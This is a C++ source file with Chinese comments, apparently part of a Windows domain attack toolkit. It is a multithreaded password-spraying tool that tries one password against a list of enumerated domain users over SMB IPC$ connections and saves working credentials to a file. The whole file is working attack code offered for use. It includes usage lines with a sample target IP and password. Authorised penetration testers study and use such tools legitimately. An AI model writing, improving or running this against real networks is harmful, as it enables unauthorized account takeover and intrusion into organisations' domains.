// 针对EnuDomainUser枚举出来的域用户列表进行爆破
#pragma once
#ifndef UNICODE
#define UNICODE
#endif
#define _CRT_SECURE_NO_WARNINGS				// 忽略安全检查错误

#include "WNetApi.h"
#include "CommonApi.h"
#include "tou.h"
#include "queue"

#define BUFFSIZE 1024

// 全局变量
WNetApi theWNetApi;
CommonApi theCommonApi;
std::mutex mtx;		// 线程锁
HANDLE hSuccessFile = theCommonApi.CreateFileApi(L"success.txt");		// 保存结果的文件
std::queue<std::wstring> domainUsersQueue;		// 存放域用户名的队列

void start(int i, LPWSTR lpRemoteName, LPWSTR lpDomainUserPassword) {

	std::wstring domainUserName;
	LPCWSTR lpDomainUserName;

	while (!domainUsersQueue.empty())
	{
		if (mtx.try_lock())
		{
			domainUserName = domainUsersQueue.front();		// 获取第一个数据
			domainUsersQueue.pop();							// 删除第一个数据
		}
		mtx.unlock();
		lpDomainUserName = domainUserName.data();
		// wprintf(L"[#%d] %s\n", i, lpDomainUserName);

		if (theWNetApi.WNetAddConnection2Api(lpRemoteName, (LPWSTR)lpDomainUserName, lpDomainUserPassword) == 1)		// 弱口令密码为用户名
		{
			theWNetApi.WNetCancelConnection2Api(lpRemoteName);
			theCommonApi.saveIPCok(hSuccessFile, lpRemoteName, (LPWSTR)lpDomainUserName, lpDomainUserPassword);
		}
		else if (GetLastError() == 1219)
		{
			// 不允许一个用户使用一个以上用户名与服务器或共享资源的多重连接。中断与此服务器或共享资源的所有连接，然后再试一次。 
			wprintf(L"[%s] multiple connections. try again. \n", lpDomainUserName);
			domainUsersQueue.push(domainUserName);			// 需要重新爆破，重新塞入队列里
			Sleep(1000);
		}
		else if (GetLastError() == 1326) {
			// 用户名或密码不正确。 
			wprintf(L"[%s] The user name or password is incorrect. \n", lpDomainUserName);
		}
		else
		{
			wprintf(L"[%s] error : %d\n", lpDomainUserName, GetLastError());
		}
		
	}
	
}

int wmain(int argc, wchar_t* argv[])
{
	setlocale(LC_ALL, "");							// 设置中文
	if (argc != 5) {
		wprintf(L"Usage: %s <domainComputerIp> <domainUser.txt> <password> <t_num>\n", argv[0]);
		wprintf(L"       %s \\\\192.168.52.29 domainUser.txt password 100\n", argv[0]);
		wprintf(L"       %s \\\\域机器IP 域用户名字典 尝试爆破的密码 多线程数目\n", argv[0]);
		exit(1);
	}

	LPWSTR lpRemoteName = argv[1];							// \\192.168.52.29
	LPWSTR lpDomainUserFileName = argv[2];					// 域用户名字典: domainUser.txt
	LPWSTR lpDomainUserPassword = argv[3];					// 域用户密码: 1qaz@WSX
	std::wstring wszThreadNum = argv[4];							// 线程数目: 10

	wprintf(L"lpRemoteName: %s\n", lpRemoteName);
	wprintf(L"lpDomainUserFileName: %s\n", lpDomainUserFileName);
	wprintf(L"lpDomainUserPassword: %s\n", lpDomainUserPassword);
	wprintf(L"lpThreadNum: %s\n", wszThreadNum.data());
	wprintf(L"------------------------------------------------------\n");


	int iThreadNum = std::stoi(wszThreadNum.data());

	FILE* pFile;
	CHAR str1[BUFFSIZE];
	LPWSTR str2;

	if ((pFile = fopen(theCommonApi.UnicodeToAnsi(lpDomainUserFileName), "rt")) == NULL)
	{
		printf("打开文件失败\n");
		exit(0);
	}

	while (fgets(str1, BUFFSIZE, pFile))
	{
		str2 = theCommonApi.AnsiToUnicode(strtok(str1, "\n"));			// 删除换行符
		domainUsersQueue.push(str2);
	}

	// 关闭文件
	fclose(pFile);
	

	// 多线程
	std::thread* Threads = new std::thread[iThreadNum];
	for (int i = 0; i < iThreadNum; i++) {
		Threads[i] = std::thread(start, i, lpRemoteName, lpDomainUserPassword);
	}
	for (int i = 0; i < iThreadNum; i++) {
		Threads[i].join();
	}
	delete[] Threads;

	

	return 0;

}